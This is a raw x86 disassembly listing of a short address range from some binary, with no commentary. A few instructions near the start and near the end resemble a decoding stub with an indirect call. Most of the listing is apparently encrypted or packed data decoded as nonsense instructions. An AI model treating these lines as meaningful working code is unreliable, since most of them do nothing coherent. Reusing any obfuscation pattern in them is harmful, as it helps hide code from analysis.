  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
  40cbf6:	push   ecx
  40cbf7:	int3   
  40cbf8:	xor    esp,DWORD PTR [esi+edi*8-0x59]
  40cbfc:	mov    bl,0xb
  40cbfe:	stc    
  40cbff:	bound  ecx,QWORD PTR [esi+edi*2+0x7e7c387e]
  40cc06:	jle    0x40cbc4
  40cc08:	add    al,0x60
  40cc0a:	xchg   DWORD PTR ds:0xe3892125,eax
  40cc10:	mov    DWORD PTR [edi-0x781a51fa],esi
  40cc16:	icebp  
  40cc17:	sti    
  40cc18:	inc    eax
  40cc19:	outs   dx,BYTE PTR ds:[esi]
  40cc1a:	sbb    al,0xa8
  40cc1c:	mov    cl,0xd8
  40cc1e:	aam    0x12
  40cc20:	sub    edx,edx
  40cc22:	pushf  
  40cc23:	or     eax,0x88ebad5e
  40cc28:	or     ch,BYTE PTR [edi-0x54]
  40cc2b:	rcl    BYTE PTR [ebp+0x4485178e],0x8a
  40cc32:	xchg   ebx,eax
  40cc33:	cmp    BYTE PTR [edi+ebp*2],dh
  40cc36:	add    ebx,esp
  40cc38:	lds    esi,FWORD PTR [edx+0x450783af]
  40cc3e:	sub    al,0x18
  40cc40:	mov    edx,0xa3f2f6d5
  40cc45:	mov    esi,0xd6997316
  40cc4a:	idiv   DWORD PTR [edx*2-0x7da5b8f3]
  40cc51:	mov    esp,0xc3a75780
  40cc56:	xor    bl,dh
  40cc58:	dec    esp
  40cc59:	ret    0x9c98
  40cc5c:	lock (bad) 
  40cc5e:	out    0xf4,al
  40cc60:	ret    
  40cc61:	xor    BYTE PTR [ebx+0x3a],bh
  40cc64:	test   DWORD PTR [edi+eiz*1],0xb96e8a1c
  40cc6b:	mov    al,ds:0xd846fa2c
  40cc70:	push   0xa5ebc4a5
  40cc75:	adc    eax,0xa59246cf
  40cc7a:	out    0x6a,eax
  40cc7c:	adc    BYTE PTR [edx+ebx*1-0x534e22eb],ch
  40cc83:	xor    al,0xb1
  40cc85:	rcl    BYTE PTR [eax+0x7dcc64e2],cl
  40cc8b:	call   0x8993:0xa0276832
  40cc92:	fs mov esi,0x20f9b143
  40cc98:	xchg   ebx,eax
  40cc99:	iret   
  40cc9a:	pop    es
  40cc9b:	inc    ecx
  40cc9c:	call   0xefda:0xa5540d33
  40cca3:	xchg   ch,dl
  40cca5:	add    BYTE PTR [ebx],0x33
  40cca8:	lea    esp,[ebx+0x30]
  40ccab:	mov    ah,0x61
  40ccad:	mov    bl,0x7
  40ccaf:	call   0xa47d:0x1cfb5316
  40ccb6:	repnz mov esp,0x8717a78d
  40ccbc:	outs   dx,BYTE PTR ds:[esi]
  40ccbd:	mov    ah,BYTE PTR [edx]
  40ccbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccc0:	pop    ds
  40ccc1:	sub    al,0x42
  40ccc3:	ins    DWORD PTR es:[edi],dx
  40ccc4:	sahf   
  40ccc5:	adc    al,0x55
  40ccc7:	mov    ebp,0x5e0670cb
  40cccc:	sar    DWORD PTR [esi],cl
  40ccce:	pop    esp
  40cccf:	inc    esi
  40ccd0:	adc    eax,0xe497a0e3
  40ccd5:	lea    ecx,[esi+0x7c26d850]
  40ccdb:	smsw   WORD PTR [ecx]
  40ccde:	cmp    BYTE PTR [eax],dl
  40cce0:	shl    BYTE PTR [ecx+0x21],0x9
  40cce4:	imul   edi,DWORD PTR gs:[edx+edx*2+0x7d],0x75faa7c5
  40cced:	fcomp  DWORD PTR [edx+0x3e]
  40ccf0:	jmp    DWORD PTR [ebx+0xe606e31]
  40ccf6:	ds and ebp,esp
  40ccf9:	jnp    0x40ccd6
  40ccfb:	xor    al,0xd1
  40ccfd:	inc    esp
  40ccfe:	cmp    eax,0xce002247
  40cd03:	push   0x8a7ecf51
  40cd08:	int3   
  40cd09:	nop
  40cd0a:	adc    DWORD PTR [esi+0xc06e404],0x7c
  40cd11:	xchg   DWORD PTR [ebp+0x5af2237],edx
  40cd17:	es and ah,bl
  40cd1a:	pop    ecx
  40cd1b:	mov    ds:0xb1fbf29e,al
  40cd20:	leave  
  40cd21:	or     ebp,DWORD PTR [ecx]
  40cd23:	mov    ?,esp
  40cd25:	push   ebx
  40cd26:	mov    dh,0xd1
  40cd28:	rcr    DWORD PTR [esi],0x66
  40cd2b:	adc    cl,bh
  40cd2d:	sti    
  40cd2e:	xchg   esi,edx
  40cd30:	inc    esp
  40cd31:	xchg   esp,eax
  40cd32:	(bad)  
  40cd33:	repz xlat BYTE PTR ds:[ebx]
  40cd35:	int    0xdf
  40cd37:	cmp    eax,0x90fe4f1b
  40cd3c:	cmp    esp,esi
  40cd3e:	pop    edi
  40cd3f:	xchg   ebp,eax
  40cd40:	sti    
  40cd41:	psrld  mm4,QWORD PTR [eax+0x4557ac5b]
  40cd48:	addr16 sbb esi,eax
  40cd4b:	xchg   ecx,eax
  40cd4c:	adc    bl,bl
  40cd4e:	or     eax,edi
  40cd50:	call   0x7f85c009
  40cd55:	retf   0x1605
  40cd58:	jge    0x40cdb6
  40cd5a:	rcr    ch,cl
  40cd5c:	inc    esp
  40cd5d:	pop    edi
  40cd5e:	dec    ebx
  40cd5f:	xor    eax,0x655cbf98
  40cd64:	out    dx,al
  40cd65:	retf   0x94bd
  40cd68:	retf   
  40cd69:	push   edx
  40cd6a:	push   es
  40cd6b:	jp     0x40cd66
  40cd6d:	pop    edx
  40cd6e:	(bad)  
  40cd6f:	push   esi
  40cd70:	mov    dh,0x44
  40cd72:	arpl   WORD PTR [eax-0x55],ax
  40cd75:	test   BYTE PTR [esi],bl
  40cd77:	enter  0xf404,0xd1
  40cd7b:	neg    DWORD PTR [esi]
  40cd7d:	push   DWORD PTR [edx]
  40cd7f:	and    al,0x75
  40cd81:	dec    esp
  40cd82:	or     BYTE PTR [edx+0x699d03c9],bl
  40cd88:	ror    DWORD PTR [ecx-0x40],cl
  40cd8b:	push   esp
  40cd8c:	pop    ebp
  40cd8d:	mov    ds:0x195a983a,al
  40cd92:	xor    al,0x0
  40cd95:	mov    ebx,DWORD PTR [esp+ecx*1]
  40cd98:	scas   al,BYTE PTR es:[edi]
  40cd99:	jp     0x40cde3
  40cd9b:	dec    edi
  40cd9c:	out    dx,al
  40cd9d:	fs xchg ecx,eax
  40cd9f:	adc    eax,0x5f9bb40a
  40cda4:	in     al,dx
  40cda5:	cmc    
  40cda6:	call   0xf397f732
  40cdab:	or     al,0x6e
  40cdad:	cmp    al,0x91
  40cdaf:	pop    ebx
  40cdb0:	or     eax,0x3abadd26
  40cdb5:	mov    bl,0x72
  40cdb7:	test   BYTE PTR [esi-0x5aacacd2],0x2f
  40cdbe:	imul   esi,DWORD PTR [edi+0x7f],0xffffffa2
  40cdc2:	cdq    
  40cdc3:	(bad)  
  40cdc4:	lods   al,BYTE PTR ds:[esi]
  40cdc5:	dec    ebx
  40cdc6:	gs inc cx
  40cdc9:	loope  0x40cd62
  40cdcb:	xchg   edx,eax
  40cdcc:	iret   
  40cdcd:	xor    edx,DWORD PTR [ebx-0x8771871]
  40cdd3:	sbb    DWORD PTR [bp-0x48d],0x6b
  40cdd9:	cmp    al,BYTE PTR [edi-0x3f223944]
  40cddf:	mov    cl,0xb2
  40cde1:	aaa    
  40cde2:	mov    esi,DWORD PTR [esi]
  40cde4:	and    al,0x10
  40cde6:	xlat   BYTE PTR ds:[ebx]
  40cde7:	xor    eax,0xdb68b26
  40cdec:	in     eax,dx
  40cded:	push   ds
  40cdee:	mov    ebp,0x61be6dbe
  40cdf3:	mov    DWORD PTR [edx],ecx
  40cdf5:	push   edx
  40cdf6:	push   ss
  40cdf7:	pop    ebp
  40cdf8:	mov    ebp,0xd8fb6fa7
  40cdfd:	mov    ch,0x5f
  40cdff:	mov    WORD PTR [ebx-0x295c7bda],gs
  40ce05:	ins    DWORD PTR es:[edi],dx
  40ce06:	mov    dh,0x3e
  40ce08:	mul    BYTE PTR [esi-0x6f]
  40ce0b:	dec    ebx
  40ce0c:	jb     0x40cdee
  40ce0e:	sub    DWORD PTR [esi],edx
  40ce10:	xchg   DWORD PTR [edi+0x7a],esi
  40ce13:	loope  0x40cdba
  40ce15:	jg     0x40cde7
  40ce17:	push   esp
  40ce18:	jg     0x40cdb0
  40ce1a:	je     0x40ce34
  40ce1c:	loope  0x40ce47
  40ce1e:	xchg   ecx,eax
  40ce1f:	addr16 xchg ebx,eax
  40ce21:	sbb    BYTE PTR [ebx-0x7f92308c],bh
  40ce27:	and    ebx,DWORD PTR [esi+0x1c]
  40ce2a:	cmp    dl,al
  40ce2c:	sub    al,0xb1
  40ce2e:	xchg   ebx,eax
  40ce2f:	mov    ch,0x5a
  40ce31:	fnstenv [ebp+0x7b]
  40ce34:	(bad)  
  40ce35:	clc    
  40ce36:	sub    edi,DWORD PTR [eax+eax*4-0x30]
  40ce3a:	test   DWORD PTR ds:[ebx],edx
  40ce3d:	sbb    bl,BYTE PTR [edi]
  40ce3f:	xchg   BYTE PTR [ebx-0x5d],al
  40ce42:	xor    BYTE PTR [ebx],cl
  40ce44:	fnstenv [edx-0x5dded35c]
  40ce4a:	je     0x40ce29
  40ce4c:	jg     0x40ce79
  40ce4e:	fld    DWORD PTR [edi+0x25ee9cb]
  40ce54:	add    BYTE PTR [eax],al
  40ce56:	push   ebx
  40ce57:	std    
  40ce58:	dec    ebx
  40ce59:	sahf   
  40ce5a:	push   ecx
  40ce5b:	push   0x84027173
  40ce60:	add    al,0xed
  40ce62:	or     al,0x75
  40ce64:	retf   0x2c19
  40ce67:	mov    edi,DWORD PTR [esi+0x7e]
  40ce6a:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ce6e:	stc    
  40ce6f:	daa    
  40ce70:	fmul   DWORD PTR [edx+0x78]
  40ce73:	aad    0xaa
  40ce75:	ret    
  40ce76:	in     al,0x98
  40ce78:	sub    esp,DWORD PTR [ebx+0x45f17fcb]
  40ce7e:	aas    
  40ce7f:	ret    0xb055
  40ce82:	mov    WORD PTR [edx],fs
  40ce84:	mov    dl,0x2b
  40ce86:	push   ecx
  40ce87:	int    0x33
  40ce89:	std    
  40ce8a:	iret   
  40ce8b:	mov    esp,gs
  40ce8d:	jbe    0x40ce72
  40ce8f:	fwait
  40ce90:	add    dl,BYTE PTR [ebp+0x21]
  40ce93:	das    
  40ce94:	icebp  
  40ce95:	jmp    0x40ce35
  40ce97:	cmp    esi,DWORD PTR [esi+ebp*2-0x14]
  40ce9b:	in     eax,dx
  40ce9c:	jmp    0x3ef4:0xc82b2010
  40cea3:	shl    DWORD PTR [ebp+0x49],1
  40cea6:	cs lahf 
  40cea8:	call   0x125a4729
  40cead:	je     0x40ceb7
  40ceaf:	in     eax,0x96
  40ceb1:	in     eax,dx
  40ceb2:	cmp    cl,bh
  40ceb4:	lock or eax,DWORD PTR [bx+di-0x62]
  40ceb9:	mov    gs,ecx
  40cebb:	das    
  40cebc:	out    0xc3,eax
  40cebe:	sub    al,0xe1
  40cec0:	add    BYTE PTR [esi],ch
  40cec2:	jnp    0x40cf02
  40cec4:	mov    esp,0xda099c4f
  40cec9:	out    0xa3,eax
  40cecb:	test   DWORD PTR [edi-0x2e5a4509],edx
  40ced1:	imul   esi,DWORD PTR [ecx-0xd],0xf0e54477
  40ced8:	aad    0x42
  40ceda:	pop    ebp
  40cedb:	adc    eax,0xad9551c0
  40cee0:	mov    edi,0x445ed96d
  40cee5:	pop    esp
  40cee6:	jl     0x40ced1
  40cee8:	into   
  40cee9:	push   edx
  40ceea:	cdq    
  40ceeb:	scas   al,BYTE PTR es:[edi]
  40ceec:	outs   dx,BYTE PTR ds:[esi]
  40ceed:	cmp    eax,0x23d4c949
  40cef2:	lea    edx,[ebp-0x1fadb803]
  40cef8:	cwde   
  40cef9:	scas   eax,DWORD PTR es:[edi]
  40cefa:	pop    edi
  40cefb:	inc    ebp
  40cefc:	mov    eax,0xa29862fc
  40cf01:	rcl    BYTE PTR ds:0x23af25f5,1
  40cf07:	es in  eax,0x94
  40cf0a:	pop    edi
  40cf0b:	bound  esp,QWORD PTR [edi]
  40cf0d:	in     al,0x8
  40cf0f:	pushf  
  40cf10:	(bad)  
  40cf11:	data16 or al,0xaa
  40cf14:	sub    dh,dl
  40cf16:	mov    bl,0xdb
  40cf18:	shl    DWORD PTR [ebx-0x51a2d3b1],cl
  40cf1e:	(bad)  
  40cf1f:	hlt    
  40cf20:	lds    ecx,FWORD PTR [edx-0x1a]
  40cf23:	dec    ecx
  40cf24:	add    esi,eax
  40cf26:	dec    DWORD PTR [eax]
  40cf28:	mov    al,ds:0xde154591
  40cf2d:	inc    esi
  40cf2e:	lahf   
  40cf2f:	fstp   DWORD PTR ds:0x84f6d1a3
  40cf35:	ret    
  40cf36:	mov    ch,0xec
  40cf38:	xor    ecx,DWORD PTR [ecx+0x1c]
  40cf3b:	aaa    
  40cf3c:	retf   
  40cf3d:	adc    cl,bh
  40cf3f:	fstp   QWORD PTR [ebx]
  40cf41:	adc    al,0xd0
  40cf43:	inc    esi
  40cf44:	retf   
  40cf45:	mov    dl,0x4
  40cf47:	sub    DWORD PTR ds:0x75b7dbb9,edx
  40cf4d:	inc    esp
  40cf4e:	dec    edi
  40cf4f:	popa   
  40cf50:	and    esi,DWORD PTR [esi]
  40cf52:	rcl    BYTE PTR [ecx+0x24],0xff
  40cf56:	pop    eax
  40cf57:	mov    eax,0xe42dbe93
  40cf5c:	mov    ecx,fs
  40cf5e:	pop    esp
  40cf5f:	aaa    
  40cf60:	fs xchg edx,eax
  40cf62:	test   DWORD PTR [edx],ecx
  40cf64:	xor    DWORD PTR [esi+0x7f],esi
  40cf67:	loope  0x40cf7f
  40cf69:	mov    ax,0x63b4
  40cf6d:	mov    ebp,0xcf30ae48
  40cf73:	pop    ebp
  40cf74:	and    al,0x77
  40cf76:	cmp    esi,esp
  40cf78:	(bad)  
  40cf79:	(bad)  
  40cf7a:	push   DWORD PTR [edx]
  40cf7c:	fdivr  DWORD PTR [ebx+0xa]
  40cf7f:	push   es
  40cf80:	xchg   edx,eax
  40cf81:	(bad)  
  40cf82:	test   al,0x43
  40cf84:	jl     0x40cfa9
  40cf86:	neg    BYTE PTR [ebx+ecx*4-0x7a]
  40cf8a:	jne    0x40cf17
  40cf8c:	rcl    BYTE PTR [eax+0x14],1
  40cf8f:	std    
  40cf90:	(bad)  
  40cf91:	lahf   
  40cf92:	es jo  0x40cf3e
  40cf95:	ds xchg edi,eax
  40cf97:	stos   BYTE PTR es:[edi],al
  40cf98:	or     al,BYTE PTR [ebx-0x72942595]
  40cf9e:	and    al,0x81
  40cfa0:	es sub esi,edx
  40cfa3:	mov    bh,0x24
  40cfa5:	add    al,0xdc
  40cfa7:	mov    WORD PTR [ecx+0x1fedf532],cs
  40cfad:	inc    edx
  40cfae:	push   esp
  40cfaf:	push   ebx
  40cfb0:	jp     0x40cfef
  40cfb2:	mov    al,0x29
  40cfb4:	mov    ecx,0x858b061c
  40cfb9:	mov    WORD PTR [ecx-0x58f63e03],es
  40cfbf:	lahf   
  40cfc0:	rcr    DWORD PTR [ebx-0x50e08ae9],0x42
  40cfc7:	push   edi
  40cfc8:	and    eax,0xfb6bcca7
  40cfcd:	test   DWORD PTR [eiz*1-0x5456f83f],ecx
  40cfd4:	and    ah,cl
  40cfd6:	pushf  
  40cfd7:	stos   DWORD PTR es:[edi],eax
  40cfd8:	sub    al,0x76
  40cfda:	sbb    ebx,0xdc69fc0e
  40cfe0:	scas   al,BYTE PTR es:[edi]
  40cfe1:	pop    esp
  40cfe2:	clc    
  40cfe3:	test   BYTE PTR [edx+0x15bcc3e5],bh
  40cfe9:	sbb    DWORD PTR [ecx],eax
  40cfeb:	enter  0x820d,0xc9
  40cfef:	out    0xff,eax
  40cff1:	jmp    0xae46:0x2782dcc4
  40cff8:	jmp    0x40cfda
  40cffa:	call   0xc5668245
  40cfff:	je     0x40d05e
  40d001:	dec    ebx
  40d002:	aas    
  40d003:	lock fwait
  40d005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d006:	jno    0x40d023
  40d008:	dec    esi
  40d009:	jle    0x40cfc0
  40d00b:	aad    0xc1
  40d00d:	cmp    cl,ch
  40d00f:	(bad)  
  40d010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d011:	into   
  40d012:	loop   0x40cfb0
  40d014:	retf   0x3524
  40d017:	(bad)  
  40d018:	cli    
  40d019:	or     bl,BYTE PTR [eax]
  40d01b:	in     eax,0x8d
  40d01d:	jmp    0x40d069
  40d01f:	fisttp WORD PTR [ecx-0x2931730]
  40d025:	fwait
  40d026:	adc    al,0xcf
  40d028:	imul   ebp,edi,0x7
  40d02b:	dec    eax
  40d02c:	test   eax,0x4bb86c41
  40d031:	outs   dx,DWORD PTR ds:[esi]
  40d032:	jno    0x40d055
  40d034:	or     ebx,DWORD PTR [edx-0x3acc28e5]
  40d03a:	pop    es
  40d03b:	adc    ah,BYTE PTR [eax+ebp*2+0x31e95f6a]
  40d042:	ficom  WORD PTR [ebx-0x66]
  40d045:	inc    ecx
  40d046:	bound  edx,QWORD PTR [esi]
  40d048:	fadd   DWORD PTR [edx+0x7af8b5dd]
  40d04e:	sbb    ch,dl
  40d050:	retf   
  40d051:	(bad)  [esi]
  40d053:	sub    DWORD PTR [eax],0x49
  40d056:	jge    0x40d06c
  40d058:	enter  0x9026,0xde
  40d05c:	adc    BYTE PTR [esi-0x59],0xc2
  40d060:	repz push eax
  40d062:	adc    eax,0x7abe7ab
  40d067:	inc    edx
  40d068:	mov    bl,0x71
  40d06a:	dec    esp
  40d06b:	aas    
  40d06c:	fidiv  DWORD PTR [edi-0x48]
  40d06f:	out    dx,al
  40d070:	and    al,0x7e
  40d072:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d073:	in     eax,0xf9
  40d075:	inc    ebp
  40d076:	aam    0xfc
  40d078:	push   eax
  40d079:	dec    esi
  40d07a:	dec    esi
  40d07b:	in     al,dx
  40d07c:	jle    0x40d071
  40d07e:	jg     0x40d01f
  40d080:	cmc    
  40d081:	ret    0xe671
  40d084:	jo     0x40d020
  40d086:	xchg   ebp,eax
  40d087:	jle    0x40d0a3
  40d089:	xor    BYTE PTR [edx+0x154beeb8],ch
  40d08f:	pop    ds
  40d090:	int3   
  40d091:	jge    0x40d0f8
  40d093:	ins    DWORD PTR es:[edi],dx
  40d094:	sub    esp,DWORD PTR [ebx+0x69]
  40d097:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d098:	jecxz  0x40d083
  40d09a:	sbb    DWORD PTR [edx+0x48daa2b9],edx
  40d0a0:	les    esp,FWORD PTR [ebp+esi*1+0x16073c30]
  40d0a7:	std    
  40d0a8:	or     DWORD PTR [edx-0x60727cc8],edx
  40d0ae:	addr16 adc al,0x83
  40d0b1:	jns    0x40d120
  40d0b3:	xor    DWORD PTR [ecx-0x75],ecx
  40d0b6:	inc    ebp
  40d0b7:	in     al,0xf
  40d0b9:	scas   eax,DWORD PTR es:[edi]
  40d0ba:	rol    DWORD PTR [ebx],0xe0
  40d0bd:	xchg   edx,eax
  40d0be:	jmp    0x40d321
  40d0c3:	sahf   
  40d0c4:	test   BYTE PTR [edi],0xc3
  40d0c7:	push   edi
  40d0c8:	repz pop edx
  40d0ca:	jae    0x40d0bf
  40d0cc:	ficom  WORD PTR [edx+0x6a]
  40d0cf:	jae    0x40d09e
  40d0d1:	push   ebx
  40d0d2:	(bad)  
  40d0d4:	mov    DWORD PTR [esi+0x7e],edi
  40d0d7:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40d0db:	arpl   bp,si
  40d0dd:	pop    esi
  40d0de:	psraw  mm0,mm5
  40d0e1:	in     eax,0x1b
  40d0e3:	mov    al,ds:0x58fb3c68
  40d0e8:	mov    bh,0x72
  40d0ea:	int3   
  40d0eb:	mov    dh,0x49
  40d0ed:	loopne 0x40d135
  40d0ef:	mov    ebx,0x676b634f
  40d0f4:	pop    ebx
  40d0f5:	or     cl,BYTE PTR [esi+0x4856a3f5]
  40d0fb:	dec    edi
  40d0fc:	ja     0x40d175
  40d0fe:	adc    eax,DWORD PTR [ecx-0x41]
  40d101:	into   
  40d102:	mov    cs,WORD PTR [edi-0x766b812b]
  40d108:	lock sahf 
  40d10a:	stos   BYTE PTR es:[edi],al
  40d10b:	mov    bl,0x6f
  40d10d:	ss out 0x96,al
  40d110:	call   0x7a48:0x4883440
  40d117:	mov    al,0xc6
  40d119:	sub    BYTE PTR [esi-0x79],al
  40d11c:	dec    esi
  40d11d:	adc    ch,BYTE PTR [eax]
  40d11f:	push   0x7cd5c2dd
  40d124:	call   0x3202b1aa
  40d129:	pop    ebp
  40d12a:	in     eax,0x86
  40d12c:	push   ds
  40d12d:	shr    BYTE PTR [esi+0x23],cl
  40d130:	mov    dh,ah
  40d132:	aam    0x29
  40d134:	sbb    eax,0x8a490acc
  40d139:	pop    eax
  40d13a:	ins    BYTE PTR es:[edi],dx
  40d13b:	into   
  40d13c:	ss inc ebp
  40d13e:	push   eax
  40d13f:	adc    bh,BYTE PTR [ecx]
  40d141:	sahf   
  40d142:	or     DWORD PTR [ebp+0x2d6981fa],esi
  40d148:	jle    0x40d15b
  40d14a:	xchg   esp,eax
  40d14b:	lods   al,BYTE PTR ds:[esi]
  40d14c:	aaa    
  40d14d:	pop    ebp
  40d14e:	push   edi
  40d14f:	push   edx
  40d150:	inc    esi
  40d151:	lahf   
  40d152:	gs sub eax,0xdd51eb7d
  40d158:	mov    ebp,0xd456afee
  40d15d:	push   esi
  40d15e:	xchg   edx,eax
  40d15f:	jns    0x40d1cd
  40d161:	test   al,0x1c
  40d163:	dec    ebx
  40d164:	or     DWORD PTR [esi],ecx
  40d166:	adc    ecx,edi
  40d168:	(bad)  
  40d169:	push   esi
  40d16a:	mov    cl,0xd
  40d16c:	jmp    0x42a08ab3
  40d171:	stos   BYTE PTR es:[edi],al
  40d172:	ficom  DWORD PTR ss:[esi-0x42]
  40d176:	lods   eax,DWORD PTR cs:[esi]
  40d178:	xor    DWORD PTR [ecx],esi
  40d17a:	scas   al,BYTE PTR es:[edi]
  40d17b:	data16 int 0x13
  40d17e:	jne    0x40d193
  40d180:	xor    bh,BYTE PTR [ecx-0x1ebf3760]
  40d186:	ins    DWORD PTR es:[edi],dx
  40d187:	jg     0x40d1b9
  40d189:	imul   eax,DWORD PTR [ecx-0x1d],0xb2cba725
  40d190:	sbb    al,0x97
  40d192:	pusha  
  40d193:	jae    0x40d20e
  40d195:	fsub   st,st(6)
  40d197:	pop    edi
  40d198:	(bad)  
  40d199:	xchg   edx,eax
  40d19a:	xchg   ecx,eax
  40d19b:	bound  esi,QWORD PTR ds:0x9aff248e
  40d1a1:	dec    eax
  40d1a2:	push   es
  40d1a3:	jp     0x40d1cb
  40d1a5:	hlt    
  40d1a6:	push   ebp
  40d1a7:	jp     0x40d1fb
  40d1a9:	xchg   BYTE PTR [edi+0x60aebcd0],dh
  40d1af:	imul   edi,esi,0xfffffffc
  40d1b2:	das    
  40d1b3:	push   ebp
  40d1b4:	cdq    
  40d1b5:	mov    esi,0xf0f1b3ce
  40d1ba:	pop    ebp
  40d1bb:	daa    
  40d1bc:	xchg   ebp,eax
  40d1bd:	fwait
  40d1be:	lahf   
  40d1bf:	pop    ds
  40d1c0:	dec    esp
  40d1c1:	rcl    BYTE PTR [esi+0x1fc6261a],1
  40d1c7:	rol    DWORD PTR [ebp+0x54],0xcb
  40d1cb:	pop    es
  40d1cc:	pop    ebx
  40d1cd:	(bad)  
  40d1ce:	pop    ebx
  40d1cf:	add    esp,DWORD PTR ds:0xcc9ce1f8
  40d1d5:	mov    eax,ds:0x3a17ccf9
  40d1da:	sub    cl,al
  40d1dc:	es xchg edx,esi
  40d1df:	cmp    cl,BYTE PTR [edi-0x31]
  40d1e2:	pop    esp
  40d1e3:	push   esi
  40d1e4:	mov    edx,0x597e496c
  40d1e9:	pop    ecx
  40d1ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1eb:	retf   0x24ba
  40d1ee:	xor    BYTE PTR [esi+0x34bcb639],cl
  40d1f4:	inc    bh
  40d1f6:	adc    BYTE PTR [ecx-0x6890e953],dl
  40d1fc:	push   ds
  40d1fd:	pop    ebp
  40d1fe:	add    eax,0x7a1f3f1b
  40d203:	ins    BYTE PTR es:[edi],dx
  40d204:	out    0x81,eax
  40d206:	xor    eax,0xee7f5f4d
  40d20b:	mov    dh,0x84
  40d20d:	sbb    BYTE PTR [ecx*4-0x42be11c],bh
  40d214:	in     al,0x0
  40d216:	loope  0x40d1b4
  40d218:	mov    WORD PTR [ecx+eiz*8],gs
  40d21b:	inc    esp
  40d21c:	cmp    edi,DWORD PTR [ecx+0x37]
  40d21f:	xor    BYTE PTR [esi+0x62b3237c],cl
  40d225:	pop    ss
  40d226:	add    al,0x48
  40d228:	(bad)  
  40d229:	and    ah,BYTE PTR [edi]
  40d22b:	mov    bh,0xce
  40d22d:	hlt    
  40d22e:	inc    edi
  40d22f:	push   es
  40d230:	lea    eax,[ecx-0xbe7621b]
  40d236:	jnp    0x40d2a8
  40d238:	imul   edx,DWORD PTR [ebx+ebp*8-0x1c],0x2c679ab6
  40d240:	cmp    eax,0x66c5fe70
  40d245:	mov    bh,0xf7
  40d247:	popa   
  40d248:	or     al,0x71
  40d24a:	bound  ax,DWORD PTR [ebx-0x67]
  40d24e:	icebp  
  40d24f:	bound  esp,QWORD PTR [eax-0x50d479d7]
  40d255:	pop    es
  40d256:	mov    bh,0xa9
  40d258:	addr16 out dx,al
  40d25a:	test   al,0x1
  40d25c:	scas   eax,DWORD PTR es:[edi]
  40d25d:	pop    eax
  40d25e:	cmc    
  40d25f:	sub    al,0x10
  40d261:	adc    ebp,ebp
  40d263:	sbb    ah,dl
  40d265:	test   DWORD PTR [ecx-0x7a],ecx
  40d268:	pop    edx
  40d269:	inc    edx
  40d26a:	retf   
  40d26b:	jmp    0x40d24b
  40d26d:	mov    edx,0xd8654418
  40d272:	cmp    BYTE PTR [ebp-0x69],0x5b
  40d276:	loopne 0x40d231
  40d278:	inc    ebx
  40d279:	inc    esi
  40d27a:	jp     0x40d2c4
  40d27c:	and    ah,dh
  40d27e:	inc    edi
  40d27f:	cmp    DWORD PTR [edi+ebx*8],esp
  40d282:	dec    edx
  40d283:	outs   dx,DWORD PTR ds:[esi]
  40d284:	add    al,0x25
  40d286:	sbb    al,0xf5
  40d288:	cmc    
  40d289:	retf   
  40d28a:	(bad)  
  40d28b:	jnp    0x40d2ae
  40d28d:	pop    esp
  40d28e:	or     al,BYTE PTR [ebx+0x481da74d]
  40d294:	clc    
  40d295:	and    dh,BYTE PTR [edi]
  40d297:	sub    al,0xd
  40d299:	stos   DWORD PTR es:[edi],eax
  40d29a:	jne    0x40d2ef
  40d29c:	sub    BYTE PTR [esi-0x4a],0xb8
  40d2a0:	shl    BYTE PTR [esp+ecx*2+0x42de6d2b],1
  40d2a7:	xor    DWORD PTR [esi],edi
  40d2a9:	dec    ecx
  40d2aa:	stc    
  40d2ab:	sbb    DWORD PTR [esi],eax
  40d2ad:	and    eax,0x96d19334
  40d2b2:	or     ebp,edi
  40d2b4:	sahf   
  40d2b5:	push   0x69
  40d2b7:	jbe    0x40d336
  40d2b9:	dec    eax
  40d2ba:	in     al,dx
  40d2bb:	lea    ebx,ds:0xd2c996c6
  40d2c1:	clc    
  40d2c2:	in     al,dx
  40d2c3:	sti    
  40d2c4:	mov    dl,0xa5
  40d2c6:	inc    ecx
  40d2c7:	ret    
  40d2c8:	sti    
  40d2c9:	mov    al,0xd6
  40d2cb:	or     ecx,DWORD PTR [eax*1+0x5e7c2d30]
  40d2d2:	js     0x40d33c
  40d2d4:	dec    esp
  40d2d5:	or     al,0xf4
  40d2d7:	lods   al,BYTE PTR ds:[esi]
  40d2d8:	push   esp
  40d2d9:	test   eax,0xa6de4ef4
  40d2de:	fdiv   DWORD PTR ds:0x6fb3b8c8
  40d2e4:	rol    BYTE PTR [ebp+0x5a8d2c24],1
  40d2ea:	into   
  40d2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2ec:	test   eax,0x82d9466e
  40d2f1:	cld    
  40d2f2:	xor    eax,0x75eef563
  40d2f7:	repz imul ecx,DWORD PTR [edi-0x4ab06483],0x3b8d8623
  40d302:	xor    BYTE PTR [edx],dl
  40d304:	out    0x85,al
  40d306:	enter  0x47ed,0x4e
  40d30a:	lahf   
  40d30b:	fs push 0x100fb14b
  40d311:	push   0xffffffa0
  40d313:	mov    ds:0x58071958,al
  40d318:	sbb    esi,DWORD PTR [ebx-0x232c264f]
  40d31e:	std    
  40d31f:	jecxz  0x40d2b2
  40d321:	push   eax
  40d322:	xor    ebx,ebx
  40d324:	mov    edx,esp
  40d326:	dec    edx
  40d327:	jmp    0x40d58a
  40d32c:	fwait
  40d32d:	push   es
  40d32e:	mov    bl,0x2a
